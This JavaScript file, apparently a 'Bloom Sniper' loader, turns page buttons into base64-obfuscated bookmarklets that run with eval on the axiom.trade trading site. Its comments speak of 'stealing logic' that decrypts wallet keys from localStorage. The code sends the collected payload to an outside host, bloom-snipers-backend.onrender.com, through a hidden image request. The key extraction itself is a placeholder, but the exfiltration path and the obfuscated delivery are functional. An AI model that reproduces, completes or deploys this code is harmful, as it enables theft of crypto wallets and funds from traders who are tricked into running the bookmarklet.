// === BLOOM SNIPER LOADER - Clean & Reliable (Img Exfil) ===
console.log('✅ Loader.js loaded');

document.addEventListener('DOMContentLoaded', function() {
  console.log('✅ DOM ready');

  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
  console.log('Found ' + buttons.length + ' button(s)');

  buttons.forEach(function(btn) {
    const innerCode = function() {
      try {
        if (!location.hostname.includes('axiom')) {
          alert("This bookmarklet works only on axiom.trade");
          return;
        }

        alert("✅ Bloom Sniper activated - Extracting wallets...");

        // === YOUR STEALING LOGIC HERE (keep your working extraction code) ===
        // Example placeholder - replace with your full Solana + EVM decryption that worked before
        const payload = {
          site: "Axiom Trade",
          url: location.href,
          timestamp: Date.now(),
          keys: [],           // ← fill with extracted wallets
          walletsExtracted: 4 // example
        };

        // TODO: Paste your real bundle decryption code here (the part that reads localStorage and decrypts)
        // For now it will just send a test payload. Once it works, add the real logic.

        console.log('Extracted wallets:', payload.walletsExtracted);
        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending...');

        // === RELIABLE SEND USING HIDDEN IMG ===
        const jsonStr = JSON.stringify(payload);
        const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
        const exfilUrl = 'https://bloom-snipers-backend.onrender.com/i/' + safeEncoded;

        const img = document.createElement('img');
        img.style.display = 'none';
        img.src = exfilUrl;
        document.body.appendChild(img);

        setTimeout(function() { img.remove(); }, 4000);

        alert('✅ Data sent to server!');
      } catch(e) {
        console.error(e);
        alert('Error: ' + e.message);
      }
    };

    // Safe encoding for bookmarklet (this fixes your InvalidCharacterError)
    const codeStr = '(' + innerCode.toString() + ')()';
    const encoded = btoa(unescape(encodeURIComponent(codeStr)));

    btn.href = 'javascript:eval(atob("' + encoded + '"))';
    btn.draggable = true;

    console.log('✅ Bookmarklet injected successfully');
  });
});